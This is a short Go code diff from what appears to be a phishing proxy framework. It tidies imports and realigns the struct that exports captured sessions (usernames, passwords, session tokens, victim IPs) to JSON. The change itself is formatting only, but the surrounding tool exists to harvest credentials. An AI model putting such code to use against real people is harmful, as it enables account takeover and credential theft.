@@ -6,9 +6,6 @@ import (
 	"encoding/base64"
 	"encoding/csv"
 	"encoding/json"
-	"encoding/csv"
-	"encoding/base64"
-	"os"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -502,13 +499,13 @@ func (t *Terminal) handleSessions(args []string) error {
 				log.Info("exported sessions to csv: %s", outFile.Name())
 			case "json":
 				type ExportedSession struct {
-					Id string `json:"id"`
-					Phishlet string `json:"phishlet"`
-					Username string `json:"username"`
-					Password string `json:"password"`
-					Tokens string `json:"tokens_base64_encoded"`
+					Id         string `json:"id"`
+					Phishlet   string `json:"phishlet"`
+					Username   string `json:"username"`
+					Password   string `json:"password"`
+					Tokens     string `json:"tokens_base64_encoded"`
 					RemoteAddr string `json:"remote_ip"`
-					Time string `json:"time"`
+					Time       string `json:"time"`
 				}
 				var exported []*ExportedSession
 				for _, s := range sessions {
@@ -518,13 +515,13 @@ func (t *Terminal) handleSessions(args []string) error {
 						break
 					}
 					es := &ExportedSession{
-						Id: strconv.Itoa(s.Id),
-						Phishlet: s.Phishlet,
-						Username: s.Username,
-						Password: s.Password,
-						Tokens: base64.StdEncoding.EncodeToString([]byte(t.tokensToJSON(pl, s.Tokens))),
+						Id:         strconv.Itoa(s.Id),
+						Phishlet:   s.Phishlet,
+						Username:   s.Username,
+						Password:   s.Password,
+						Tokens:     base64.StdEncoding.EncodeToString([]byte(t.tokensToJSON(pl, s.Tokens))),
 						RemoteAddr: s.RemoteAddr,
-						Time: time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"),
+						Time:       time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"),
 					}
 					exported = append(exported, es)
 				}
